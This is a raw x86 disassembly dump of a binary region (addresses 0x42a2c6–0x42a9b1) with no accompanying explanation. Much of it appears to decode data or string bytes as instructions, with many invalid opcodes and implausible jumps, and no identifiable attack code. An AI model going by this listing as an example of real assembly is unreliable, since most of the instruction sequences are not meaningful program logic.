  42a2c6:	add    DWORD PTR [ebx],eax
  42a2c8:	add    BYTE PTR [eax+0x4d],dl
  42a2cb:	jne    0x42a300
  42a2cd:	lea    ecx,[ebx-0x7617fc44]
  42a2d3:	div    ah
  42a2d5:	inc    DWORD PTR [ebp+0x45]
  42a2d8:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  42a2de:	jb     0x42a26b
  42a2e0:	add    BYTE PTR [eax*2-0x17ba743f],cl
  42a2e7:	mov    ecx,DWORD PTR [ebp-0x10]
  42a2ea:	xor    ecx,DWORD PTR [ebp+0x3]
  42a2ed:	mov    edi,DWORD PTR [ebx]
  42a2ef:	adc    BYTE PTR [ebp+0x41],dh
  42a2f2:	mov    ecx,DWORD PTR [ebx-0x37382704]
  42a2f8:	ret    
  42a2f9:	push   ss
  42a2fa:	push   0x45
  42a2fc:	lea    ecx,[ebx+0x4de80cb0]
  42a302:	sti    
  42a303:	add    edi,edi
  42a305:	or     BYTE PTR [ebp+0x4d],al
  42a308:	mov    ebp,DWORD PTR [ebx]
  42a30a:	xor    ebp,ecx
  42a30c:	mov    al,BYTE PTR [edx]
  42a30e:	add    eax,0xc7200
  42a313:	jne    0x42a362
  42a315:	lea    esi,[ebx]
  42a317:	mov    al,0xf
  42a319:	call   0xe99de
  42a31e:	sar    DWORD PTR [eax],0x84
  42a321:	pushf  
  42a322:	add    DWORD PTR [ecx+0x4545d000],ecx
  42a328:	mov    edi,DWORD PTR [ecx]
  42a32a:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  42a331:	test   DWORD PTR [eax],eax
  42a333:	clc    
  42a334:	dec    ebp
  42a335:	inc    ebp
  42a336:	xor    edi,DWORD PTR [ebx]
  42a338:	setl   al
  42a33b:	(bad)  
  42a33c:	retf   
  42a33d:	rol    cl,1
  42a33f:	dec    ebp
  42a340:	test   BYTE PTR [ebp+0x4d00cc01],cl
  42a346:	inc    ebp
  42a347:	lea    ecx,[ebx-0x75b2cc38]
  42a34d:	lea    eax,ds:0x4d72c4
  42a353:	mov    ecx,DWORD PTR [ebp-0x4]
  42a356:	xor    ecx,edi
  42a358:	bswap  ebx
  42a35a:	ror    BYTE PTR [ebp-0x35],0xe9
  42a35e:	rol    DWORD PTR [ecx],0x84
  42a361:	add    BYTE PTR [ecx],al
  42a363:	cmp    al,BYTE PTR [eax]
  42a365:	pushf  
  42a366:	inc    ebp
  42a367:	jnp    0x8a42d76a
  42a36d:	mov    eax,DWORD PTR ds:0xcf72e8
  42a373:	lock dec ebp
  42a375:	retf   
  42a376:	xor    ecx,DWORD PTR [ebp+0xf]
  42a379:	mov    eax,eax
  42a37b:	fmul   st,st(3)
  42a37d:	test   ecx,0x1988484
  42a383:	xor    al,BYTE PTR [eax]
  42a385:	mov    DWORD PTR [ebp-0x28],eax
  42a388:	mov    eax,DWORD PTR [ebp+0x33]
  42a38b:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  42a391:	ret    
  42a392:	add    al,cl
  42a394:	dec    ebp
  42a395:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  42a39b:	add    ecx,DWORD PTR ds:0xc7250
  42a3a1:	inc    ebp
  42a3a2:	rcl    DWORD PTR [eax+0x4d],0x27
  42a3a6:	mov    edi,edi
  42a3a8:	xor    ecx,DWORD PTR [ebx+0xde48a]
  42a3ae:	jb     0x42a377
  42a3b0:	add    BYTE PTR [ecx+eax*8-0x74cdb2b8],al
  42a3b7:	mov    esi,DWORD PTR [ebx]
  42a3b9:	cld    
  42a3ba:	mov    cl,bh
  42a3bc:	or     eax,0x372b6
  42a3c1:	cmp    ecx,eax
  42a3c3:	jne    0x42a440
  42a3c9:	mov    eax,DWORD PTR [ebp-0x20]
  42a3cc:	mov    eax,DWORD PTR [eax]
  42a3ce:	xor    eax,edi
  42a3d0:	mov    al,BYTE PTR [ebp+eax*1+0x327248]
  42a3d7:	mov    ecx,DWORD PTR [ebp-0x4]
  42a3da:	mov    ecx,edi
  42a3dc:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42a3e2:	jb     0x42a3f3
  42a3e4:	add    BYTE PTR [edi-0x3f],dl
  42a3e7:	add    BYTE PTR [ebp-0x75],cl
  42a3ea:	mov    esi,eax
  42a3ec:	xor    eax,DWORD PTR [eax]
  42a3ee:	mov    al,bh
  42a3f0:	or     eax,0x487284
  42a3f5:	xor    al,cl
  42a3f7:	mov    ecx,DWORD PTR [ebp-0x4]
  42a3fa:	mov    ecx,edi
  42a3fc:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42a402:	jb     0x42a413
  42a404:	add    BYTE PTR [edi],dh
  42a406:	enter  0x8500,0x8b
  42a40a:	add    ah,bl
  42a40c:	add    BYTE PTR [eax],al
  42a40e:	inc    ebp
  42a40f:	(bad)  
  42a410:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a48]
  42a417:	mov    esi,DWORD PTR [edx-0x4]
  42a41a:	add    bh,cl
  42a41c:	dec    ebp
  42a41d:	mov    dh,0x8b
  42a41f:	add    esi,DWORD PTR [ebx]
  42a421:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  42a427:	add    BYTE PTR [eax],al
  42a429:	mov    eax,ecx
  42a42b:	loopne 0x42a47a
  42a42d:	add    BYTE PTR [ebx-0x757bcc39],cl
  42a433:	dec    eax
  42a434:	or     eax,0x8b7232
  42a439:	in     al,0xc1
  42a43b:	or     DWORD PTR [ebp-0x31],ecx
  42a43e:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a48]
  42a445:	xor    dh,BYTE PTR [edx-0x75]
  42a448:	add    al,dh
  42a44a:	enter  0x4f09,0xcf
  42a44e:	inc    ebp
  42a44f:	mov    WORD PTR [ebx-0x75cdccb8],cs
  42a455:	or     al,BYTE PTR ds:0xe4728b
  42a45b:	or     DWORD PTR [ebp-0x31],ecx
  42a45e:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4c]
  42a465:	cmp    dh,BYTE PTR [edx+0xf]
  42a468:	add    bl,dl
  42a46a:	rol    DWORD PTR [eax],0x4d
  42a46d:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  42a473:	(bad)  
  42a474:	or     eax,0x487284
  42a479:	xor    al,cl
  42a47b:	mov    ecx,DWORD PTR [ebp-0x20]
  42a47e:	mov    ecx,DWORD PTR [ecx]
  42a480:	xor    ecx,edi
  42a482:	mov    cl,BYTE PTR [ebp+ecx*1+0x327248]
  42a489:	xor    cl,al
  42a48b:	mov    ecx,DWORD PTR [edi]
  42a48d:	fadd   QWORD PTR [ebp+0x9]
  42a490:	call   0xffcf9f64
  42a495:	dec    eax
  42a496:	dec    ebp
  42a497:	xor    bh,BYTE PTR [ebx]
  42a499:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  42a49d:	loopne 0x42a49b
  42a49f:	or     edi,eax
  42a4a1:	iret   
  42a4a2:	ret    
  42a4a3:	mov    WORD PTR [ebp+0x4c],es
  42a4a6:	mov    esi,DWORD PTR [edx]
  42a4a8:	call   0x84526be7
  42a4ad:	(bad)  
  42a4ae:	cwde   
  42a4af:	add    BYTE PTR [edx],dh
  42a4b1:	mov    esi,DWORD PTR [ebx]
  42a4b3:	fmul   QWORD PTR [ebx+0x55c7fc00]
  42a4b9:	test   BYTE PTR [ebx],dh
  42a4bb:	dec    eax
  42a4bc:	add    esi,DWORD PTR [edx]
  42a4be:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  42a4c4:	dec    edi
  42a4c6:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d48]
  42a4cd:	xor    al,BYTE PTR [ebx]
  42a4cf:	mov    edi,DWORD PTR [ebx]
  42a4d1:	in     al,0x75
  42a4d3:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  42a4d9:	dec    eax
  42a4da:	xor    esi,DWORD PTR [edx]
  42a4dc:	lea    ecx,[edx]
  42a4de:	or     BYTE PTR [ebx+0x900f072],cl
  42a4e4:	ja     0x42a4b5
  42a4e6:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b4],cl
  42a4ed:	cmp    ch,al
  42a4ef:	jne    0x42a4e4
  42a4f1:	mov    edi,edi
  42a4f3:	fadd   QWORD PTR [ebp+0x0]
  42a4f6:	mov    eax,edi
  42a4f8:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb8]
  42a4ff:	mov    edx,DWORD PTR [ebx]
  42a501:	in     al,0x45
  42a503:	or     DWORD PTR [ebx],esi
  42a505:	iret   
  42a506:	add    ecx,DWORD PTR [eax+edx*2+0x45321848]
  42a50d:	xor    dl,BYTE PTR [eax-0x75]
  42a510:	sbb    al,ah
  42a512:	dec    DWORD PTR [ecx]
  42a514:	mov    ecx,edi
  42a516:	in     al,dx
  42a517:	mov    eax,es
  42a519:	dec    eax
  42a51a:	mov    DWORD PTR [edx],esi
  42a51c:	fmul   QWORD PTR [edx]
  42a51e:	jne    0x42a4ab
  42a520:	(bad)  
  42a521:	(bad)  
  42a523:	or     DWORD PTR [ebp-0x31],eax
  42a526:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b4]
  42a52d:	cmp    bh,bh
  42a52f:	jne    0x42a576
  42a531:	lea    ecx,[ebx-0x38372750]
  42a537:	inc    ebx
  42a539:	mov    eax,ecx
  42a53b:	mov    eax,0xa00c111
  42a540:	jne    0x42a587
  42a542:	mov    esi,DWORD PTR [ebx]
  42a544:	test   al,0x3
  42a546:	inc    ebp
  42a547:	mov    DWORD PTR [eax-0xc],edx
  42a54a:	fiadd  WORD PTR [ebp-0x1]
  42a54d:	xor    ecx,DWORD PTR [ebx+0x4d30108d]
  42a553:	jb     0x42a556
  42a555:	add    BYTE PTR [ebx+0x454dacc7],cl
  42a55b:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  42a561:	retf   
  42a562:	mov    edx,ecx
  42a564:	adc    al,0x84
  42a566:	(bad)  
  42a567:	std    
  42a568:	ret    
  42a569:	jmp    FWORD PTR [edi-0x2b7474bb]
  42a56f:	hlt    
  42a570:	rol    edi,0x82
  42a573:	ret    
  42a574:	cld    
  42a575:	enter  0x11ff,0x45
  42a579:	inc    ebp
  42a57a:	pop    edi
  42a57b:	mov    ebx,DWORD PTR [ebx+0x14]
  42a57e:	ret    0xc7
  42a581:	test   BYTE PTR [ebx+0x45325198],cl
  42a587:	jmp    0x42a514
  42a589:	push   0x8
  42a58b:	call   DWORD PTR [esi]
  42a58d:	in     al,dx
  42a58e:	add    BYTE PTR [ebp+0x1],0x50
  42a592:	add    bl,ah
  42a594:	add    bh,bh
  42a596:	icebp  
  42a597:	mov    ecx,DWORD PTR [eax]
  42a599:	cld    
  42a59a:	pop    es
  42a59b:	dec    ebp
  42a59c:	shl    DWORD PTR [ebx],0x72
  42a59f:	add    eax,DWORD PTR [eax]
  42a5a1:	cmp    edx,ecx
  42a5a3:	je     0x42a5b5
  42a5a5:	mov    esi,DWORD PTR [ebp-0x4]
  42a5a8:	inc    edi
  42a5aa:	or     al,0xc3
  42a5ac:	jmp    FWORD PTR [edx-0x18]
  42a5af:	(bad)  
  42a5b0:	sti    
  42a5b1:	cwde   
  42a5b2:	(bad)  
  42a5b3:	call   0xffa09ebe
  42a5b8:	or     al,0x45
  42a5ba:	push   ebp
  42a5bb:	sub    esp,0x18
  42a5be:	push   ebx
  42a5bf:	inc    ebp
  42a5c0:	mov    edi,edi
  42a5c2:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  42a5c9:	test   al,0x50
  42a5cb:	inc    ebp
  42a5cc:	push   ecx
  42a5cd:	push   eax
  42a5ce:	xor    esp,DWORD PTR [edi-0x748d0041]
  42a5d4:	add    ah,bh
  42a5d6:	(bad)  
  42a5d7:	dec    ebp
  42a5d8:	add    DWORD PTR [ebx],esi
  42a5da:	inc    ebp
  42a5db:	add    ecx,DWORD PTR [ebx+0x74943b]
  42a5e1:	push   0xffffff8b
  42a5e3:	dec    DWORD PTR [ebx-0x7fbaeb54]
  42a5e9:	add    eax,DWORD PTR [ecx]
  42a5eb:	or     BYTE PTR [eax],al
  42a5ed:	call   0xff849df2
  42a5f2:	mov    eax,DWORD PTR [ebp+0x14]
  42a5f5:	mov    ecx,DWORD PTR [ecx+0x801ac]
  42a5fb:	inc    ebp
  42a5fc:	dec    ecx
  42a5fd:	add    ebp,DWORD PTR [edx+0x14]
  42a600:	push   0x8b3045
  42a605:	call   0x33acf37a
  42a60a:	inc    DWORD PTR [ebx]
  42a60c:	mov    DWORD PTR [edi],ecx
  42a60e:	mov    eax,ecx
  42a610:	or     BYTE PTR [ebp-0x3d],cl
  42a613:	cmp    eax,edi
  42a615:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  42a61a:	adc    BYTE PTR [ebx+0x5eff0845],cl
  42a620:	adc    al,0xc9
  42a622:	inc    ebp
  42a623:	adc    BYTE PTR [eax+0x55],dl
  42a626:	jne    0x42a614
  42a628:	call   0xff53a5b8
  42a62d:	dec    ebp
  42a62e:	inc    ebp
  42a62f:	mov    ecx,DWORD PTR [ebx+0x390338b]
  42a635:	add    BYTE PTR [ebx],bh
  42a637:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  42a63b:	push   eax
  42a63c:	or     al,0x51
  42a63e:	dec    ebp
  42a63f:	xor    DWORD PTR [ebx],0xf320398
  42a645:	cmp    eax,DWORD PTR [ebp+0x74]
  42a648:	mov    edi,edi
  42a64a:	pop    edi
  42a64b:	adc    BYTE PTR [ebx+0x75],bl
  42a64e:	ret    0x50
  42a651:	mov    edx,DWORD PTR ss:[edi-0x7d]
  42a655:	(bad)  
  42a656:	clc    
  42a657:	mov    esp,ebp
  42a659:	pop    ecx
  42a65a:	mov    ecx,0xf80085c2
  42a65f:	mov    ecx,DWORD PTR [ecx+edx*2]
  42a662:	push   esi
  42a663:	push   esi
  42a664:	(bad)  
  42a665:	lock add DWORD PTR [ebp+0x44],eax
  42a669:	mov    edx,DWORD PTR [eax]
  42a66b:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  42a66f:	or     BYTE PTR [eax+0x7],dl
  42a672:	push   ecx
  42a673:	ret    
  42a674:	xor    ebx,DWORD PTR [eax+0x37232be]
  42a67a:	add    BYTE PTR [ecx+0x147c8bfe],cl
  42a680:	or     al,0x80
  42a682:	jge    0x42a685
  42a684:	mov    DWORD PTR [eax],eax
  42a686:	and    al,0x8
  42a688:	cmp    DWORD PTR [ebp+0x10],eax
  42a68b:	mov    edx,DWORD PTR [esi]
  42a68d:	xchg   esp,eax
  42a68e:	dec    esp
  42a68f:	add    BYTE PTR [eax],dl
  42a691:	mov    ecx,edx
  42a693:	add    edx,DWORD PTR [esp+edi*1+0x8]
  42a697:	dec    ebp
  42a698:	into   
  42a699:	mov    ebp,DWORD PTR [edi+0x240089d8]
  42a69f:	mov    edx,DWORD PTR [eax+0x14]
  42a6a2:	das    
  42a6a3:	add    al,0x45
  42a6a5:	add    BYTE PTR [ebp+0x0],dh
  42a6a8:	mov    edi,edi
  42a6aa:	and    al,0x50
  42a6ac:	mov    eax,DWORD PTR [eax]
  42a6ae:	and    al,0xd1
  42a6b0:	xor    eax,DWORD PTR [esi]
  42a6b2:	lea    eax,[ebp+0x8]
  42a6b5:	xor    esi,DWORD PTR [edx+0x3]
  42a6b8:	add    BYTE PTR [ecx+0x4510fc44],cl
  42a6be:	cmp    cl,BYTE PTR [ebx+0x75eb0c9c]
  42a6c4:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  42a6ce:	cmp    edi,edi
  42a6d0:	pushf  
  42a6d1:	mov    edi,edi
  42a6d3:	or     BYTE PTR [esi+ecx*1],cl
  42a6d6:	jne    0x42a69b
  42a6d8:	call   0xba6a4
  42a6dd:	adc    BYTE PTR [ebp+eax*2+0xc],al
  42a6e1:	mov    ebx,DWORD PTR [eax]
  42a6e3:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  42a6e7:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  42a6ef:	pop    esi
  42a6f0:	dec    ecx
  42a6f2:	and    al,0x10
  42a6f4:	call   DWORD PTR [ebp+0x24]
  42a6f7:	in     al,dx
  42a6f8:	call   0xffc6a5e1
  42a6fd:	adc    BYTE PTR [eax+edi*1+0xc],al
  42a701:	pushf  
  42a702:	pop    esi
  42a703:	mov    ebp,esp
  42a705:	and    al,0xc2
  42a707:	push   edi
  42a708:	add    BYTE PTR [ecx+0x3a],al
  42a70b:	mov    DWORD PTR [ebp+0x24],esi
  42a70e:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  42a714:	dec    DWORD PTR [eax]
  42a716:	and    al,0x7
  42a718:	(bad)  
  42a719:	cli    
  42a71a:	and    al,0x98
  42a71c:	or     BYTE PTR [edx],dh
  42a71e:	sbb    BYTE PTR [ebx],al
  42a720:	adc    al,0x89
  42a722:	jmp    DWORD PTR [esp]
  42a725:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  42a72b:	adc    al,0x8
  42a72d:	dec    ebp
  42a72e:	adc    BYTE PTR [ebp-0x7c],dh
  42a731:	mov    esi,DWORD PTR [edx]
  42a733:	and    al,0x24
  42a735:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  42a73b:	add    edi,eax
  42a73d:	pcmpeqb mm1,mm2
  42a740:	jmp    0x42a78e
  42a742:	dec    DWORD PTR [eax]
  42a744:	je     0x42a731
  42a746:	mov    edi,DWORD PTR [ecx]
  42a748:	pop    ebp
  42a749:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  42a74d:	cwde   
  42a74e:	mov    DWORD PTR [eax-0x8],ebp
  42a751:	jge    0x42a7bb
  42a753:	dec    DWORD PTR [ecx+0x5fbf7424]
  42a759:	jl     0x42a7a5
  42a75b:	adc    BYTE PTR [eax],al
  42a75d:	pop    esp
  42a75e:	cmp    al,0x10
  42a760:	add    BYTE PTR [ecx+0x41],dl
  42a763:	adc    BYTE PTR [eax],al
  42a765:	test   al,0x21
  42a767:	adc    BYTE PTR [eax],al
  42a769:	cs jbe 0x42a77c
  42a76c:	add    BYTE PTR [edx+0xe],ch
  42a76f:	adc    BYTE PTR [eax],al
  42a771:	clc    
  42a772:	pusha  
  42a773:	adc    BYTE PTR [eax],al
  42a775:	jp     0x42a7b8
  42a777:	adc    BYTE PTR [eax],al
  42a779:	mov    ds:0x88001059,eax
  42a77e:	pop    ebp
  42a77f:	adc    BYTE PTR [eax],al
  42a781:	inc    ax
  42a783:	adc    BYTE PTR [eax],al
  42a785:	pop    ecx
  42a786:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a787:	inc    edx
  42a788:	add    BYTE PTR [ebp-0x59],bl
  42a78b:	inc    edx
  42a78c:	add    BYTE PTR [ecx-0x59],ah
  42a78f:	inc    edx
  42a790:	add    BYTE PTR [ebp-0x59],ah
  42a793:	inc    edx
  42a794:	add    BYTE PTR [ecx-0x59],ch
  42a797:	inc    edx
  42a798:	add    BYTE PTR [ebp-0x59],ch
  42a79b:	inc    edx
  42a79c:	add    BYTE PTR [ecx-0x59],dh
  42a79f:	inc    edx
  42a7a0:	add    BYTE PTR [ebp-0x59],dh
  42a7a3:	inc    edx
  42a7a4:	add    BYTE PTR [ecx-0x59],bh
  42a7a7:	inc    edx
  42a7a8:	add    BYTE PTR [ebp-0x59],bh
  42a7ab:	inc    edx
  42a7ac:	add    BYTE PTR [ecx-0x2effbd59],al
  42a7b2:	cmp    BYTE PTR [eax],dl
  42a7b4:	add    BYTE PTR [edi],dl
  42a7b6:	xor    BYTE PTR [eax],dl
  42a7b8:	add    BYTE PTR [eax],al
  42a7ba:	pop    ds
  42a7bb:	adc    BYTE PTR [eax],al
  42a7bd:	(bad)  
  42a7be:	adc    BYTE PTR ds:[eax],al
  42a7c1:	in     eax,0x19
  42a7c3:	adc    BYTE PTR [eax],al
  42a7c5:	bound  ebx,QWORD PTR [ecx]
  42a7c7:	adc    BYTE PTR [eax],al
  42a7c9:	shl    BYTE PTR [edi+0x10],1
  42a7cc:	add    BYTE PTR [edi-0x4effefa9],al
  42a7d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7d3:	inc    edx
  42a7d4:	add    BYTE PTR [ebp-0x46ffbd59],dh
  42a7da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7db:	inc    edx
  42a7dc:	add    BYTE PTR [ebp-0x3effbd59],bh
  42a7e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7e3:	inc    edx
  42a7e4:	add    ch,al
  42a7e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7e7:	inc    edx
  42a7e8:	add    cl,cl
  42a7ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7eb:	inc    edx
  42a7ec:	add    ch,cl
  42a7ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a7ef:	inc    edx
  42a7f0:	add    dl,ah
  42a7f2:	adc    BYTE PTR ds:[eax],al
  42a7f5:	ds pop ebp
  42a7f7:	adc    BYTE PTR [eax],al
  42a7f9:	add    BYTE PTR [esi+0x10],ah
  42a7fc:	add    al,ch
  42a7fe:	pop    eax
  42a7ff:	adc    BYTE PTR [eax],al
  42a801:	cdq    
  42a802:	outs   dx,BYTE PTR ds:[esi]
  42a803:	adc    BYTE PTR [eax],al
  42a805:	ja     0x42a867
  42a807:	adc    BYTE PTR [eax],al
  42a809:	jne    0x42a842
  42a80b:	adc    BYTE PTR [eax],al
  42a80d:	arpl   WORD PTR [eax+edx*1],bx
  42a810:	add    cl,dh
  42a812:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a813:	inc    edx
  42a814:	add    ch,dh
  42a816:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a817:	inc    edx
  42a818:	add    cl,bh
  42a81a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a81b:	inc    edx
  42a81c:	add    ch,bh
  42a81e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a81f:	inc    edx
  42a820:	add    BYTE PTR [ecx],al
  42a822:	test   al,0x42
  42a824:	add    BYTE PTR ds:0x90042a8,al
  42a82a:	test   al,0x42
  42a82c:	add    BYTE PTR ds:0x5c0042a8,cl
  42a832:	adc    DWORD PTR [eax],edx
  42a834:	add    BYTE PTR [ebp+edx*2+0x9fe0010],bl
  42a83b:	adc    BYTE PTR [eax],al
  42a83d:	and    al,0x30
  42a83f:	adc    BYTE PTR [eax],al
  42a841:	ret    
  42a842:	pop    edi
  42a843:	adc    BYTE PTR [eax],al
  42a845:	loopne 0x42a8ad
  42a847:	adc    BYTE PTR [eax],al
  42a849:	add    eax,0xd400105b
  42a84e:	aas    
  42a84f:	adc    BYTE PTR [eax],al
  42a851:	xor    DWORD PTR [eax-0x57caffbe],ebp
  42a857:	inc    edx
  42a858:	add    BYTE PTR [ecx],bh
  42a85a:	test   al,0x42
  42a85c:	add    BYTE PTR ds:0x410042a8,bh
  42a862:	test   al,0x42
  42a864:	add    BYTE PTR [ebp-0x58],al
  42a867:	inc    edx
  42a868:	add    BYTE PTR [ecx-0x58],cl
  42a86b:	inc    edx
  42a86c:	add    BYTE PTR [ebp-0x58],cl
  42a86f:	inc    edx
  42a870:	add    dh,dl
  42a872:	sbb    eax,0x10f00010
  42a877:	adc    BYTE PTR [eax],al
  42a879:	inc    ecx
  42a87a:	bound  edx,QWORD PTR [eax]
  42a87c:	add    BYTE PTR [ebx+eax*1],ah
  42a87f:	adc    BYTE PTR [eax],al
  42a881:	jecxz  0x42a8e6
  42a883:	adc    BYTE PTR [eax],al
  42a885:	pushf  
  42a886:	xor    DWORD PTR [eax],edx
  42a888:	add    BYTE PTR [ecx],al
  42a88a:	or     dl,BYTE PTR [eax]
  42a88c:	add    dh,dl
  42a88e:	inc    edi
  42a88f:	adc    BYTE PTR [eax],al
  42a891:	jno    0x42a83b
  42a893:	inc    edx
  42a894:	add    BYTE PTR [ebp-0x58],dh
  42a897:	inc    edx
  42a898:	add    BYTE PTR [ecx-0x58],bh
  42a89b:	inc    edx
  42a89c:	add    BYTE PTR [ebp-0x58],bh
  42a89f:	inc    edx
  42a8a0:	add    BYTE PTR [ecx-0x7affbd58],al
  42a8a6:	test   al,0x42
  42a8a8:	add    BYTE PTR [ecx-0x72ffbd58],cl
  42a8ae:	test   al,0x42
  42a8b0:	add    BYTE PTR [ebx+0x32],al
  42a8b3:	xor    dh,BYTE PTR ds:0x5a52345f
  42a8b9:	push   esp
  42a8ba:	xor    BYTE PTR [esi],dh
  42a8bc:	add    BYTE PTR [ecx+0x36],cl
  42a8bf:	push   eax
  42a8c0:	pop    edi
  42a8c1:	ss inc ebx
  42a8c3:	ss pop edx
  42a8c5:	xor    ebx,DWORD PTR [edi+0x52]
  42a8c8:	add    BYTE PTR [edi+ecx*2+0x32],dl
  42a8cc:	pop    edi
  42a8cd:	dec    esi
  42a8ce:	dec    esp
  42a8cf:	dec    eax
  42a8d0:	xor    esi,DWORD PTR [edx]
  42a8d2:	pop    edi
  42a8d3:	xor    al,0x4b
  42a8d5:	add    BYTE PTR [eax+0x49],cl
  42a8d8:	push   ebp
  42a8d9:	xor    al,0x5f
  42a8db:	dec    esp
  42a8dc:	inc    edx
  42a8dd:	dec    ecx
  42a8de:	cmp    DWORD PTR [edi+ebx*2],esi
  42a8e1:	pop    ecx
  42a8e2:	inc    edi
  42a8e3:	add    BYTE PTR [eax+0x50],bl
  42a8e6:	dec    eax
  42a8e7:	pop    edi
  42a8e8:	push   ebp
  42a8e9:	push   ecx
  42a8ea:	inc    edi
  42a8eb:	xor    cl,BYTE PTR [edx+0x38]
  42a8ee:	push   esi
  42a8ef:	add    BYTE PTR [ebx+0x4a],al
  42a8f2:	push   edx
  42a8f3:	pop    edi
  42a8f4:	dec    edi
  42a8f5:	dec    eax
  42a8f6:	dec    edi
  42a8f7:	dec    edi
  42a8f8:	dec    edx
  42a8f9:	add    BYTE PTR [ecx+0x52],al
  42a8fc:	cmp    DWORD PTR [edi+0x56],ebx
  42a8ff:	aaa    
  42a900:	dec    esp
  42a901:	cmp    DWORD PTR [ebx+0x5f],eax
  42a904:	push   edx
  42a905:	inc    esp
  42a906:	add    BYTE PTR [ecx+0x37],bl
  42a909:	inc    esp
  42a90a:	pop    edi
  42a90b:	dec    ecx
  42a90c:	xor    esi,DWORD PTR [edi]
  42a90e:	xor    DWORD PTR [edi+0x49],ebx
  42a911:	push   esp
  42a912:	xor    eax,DWORD PTR [eax]
  42a914:	push   edx
  42a915:	xor    BYTE PTR [eax+0x5f],bl
  42a918:	dec    eax
  42a919:	push   edi
  42a91a:	inc    esi
  42a91b:	xor    DWORD PTR [edi+0x5f],edx
  42a91e:	cmp    BYTE PTR [ebx+0x37],dl
  42a921:	add    BYTE PTR [esi+0x42],dl
  42a924:	dec    ecx
  42a925:	xor    ebx,DWORD PTR [edi+0x45]
  42a928:	xor    BYTE PTR [ebp+0x5f],cl
  42a92b:	xor    al,0x34
  42a92d:	xor    BYTE PTR [edx+0x5f],cl
  42a930:	inc    edi
  42a931:	add    BYTE PTR [edx+0x57],dl
  42a934:	xor    ebx,DWORD PTR [edi+0x31]
  42a937:	dec    edx
  42a938:	push   edi
  42a939:	xor    eax,0x4d435f
  42a93e:	dec    ecx
  42a93f:	xor    eax,0x36365f39
  42a944:	dec    eax
  42a945:	xor    BYTE PTR [eax],al
  42a947:	dec    edi
  42a948:	inc    ebx
  42a949:	push   edi
  42a94a:	pop    edi
  42a94b:	inc    edi
  42a94c:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  42a951:	add    BYTE PTR [edx+0x58],al
  42a954:	inc    edi
  42a955:	ss pop edi
  42a957:	push   esi
  42a958:	inc    ebx
  42a959:	dec    esi
  42a95a:	inc    esp
  42a95b:	add    BYTE PTR [edi+0x4d],cl
  42a95e:	inc    edi
  42a95f:	xor    ebx,DWORD PTR [edi+0x34]
  42a962:	dec    esi
  42a963:	pop    edx
  42a964:	cmp    BYTE PTR [edi+0x58],bl
  42a967:	cmp    BYTE PTR [eax],al
  42a969:	push   edx
  42a96a:	pop    eax
  42a96b:	push   ecx
  42a96c:	pop    edi
  42a96d:	dec    esp
  42a96e:	push   edx
  42a96f:	dec    ecx
  42a970:	dec    edi
  42a971:	inc    esp
  42a972:	pop    edi
  42a973:	dec    edi
  42a974:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  42a978:	push   eax
  42a979:	inc    ebp
  42a97a:	pop    edi
  42a97b:	xor    eax,0x565f3945
  42a980:	add    BYTE PTR [edi+0x4e],al
  42a983:	push   esi
  42a984:	pop    edi
  42a985:	inc    edi
  42a986:	push   esp
  42a987:	dec    eax
  42a988:	xor    dh,BYTE PTR [ecx]
  42a98a:	pop    edi
  42a98b:	dec    edi
  42a98c:	xor    eax,DWORD PTR ss:[eax]
  42a98f:	inc    esp
  42a990:	inc    ebp
  42a991:	dec    ecx
  42a992:	pop    edi
  42a993:	push   edx
  42a994:	dec    eax
  42a995:	xor    al,0x48
  42a997:	dec    ecx
  42a998:	ss pop edi
  42a99a:	aaa    
  42a99b:	aaa    
  42a99c:	dec    ecx
  42a99d:	dec    ebp
  42a99e:	add    BYTE PTR [eax+0x54],cl
  42a9a1:	ss pop edi
  42a9a3:	inc    esi
  42a9a4:	inc    edx
  42a9a5:	xor    dh,BYTE PTR [eax+eax*1]
  42a9a8:	dec    esi
  42a9a9:	ss dec edx
  42a9ab:	pop    edi
  42a9ac:	dec    ecx
  42a9ad:	dec    esp
  42a9ae:	inc    edi
  42a9af:	inc    esp
  42a9b0:	dec    eax
  42a9b1:	xor    BYTE PTR [eax],bh
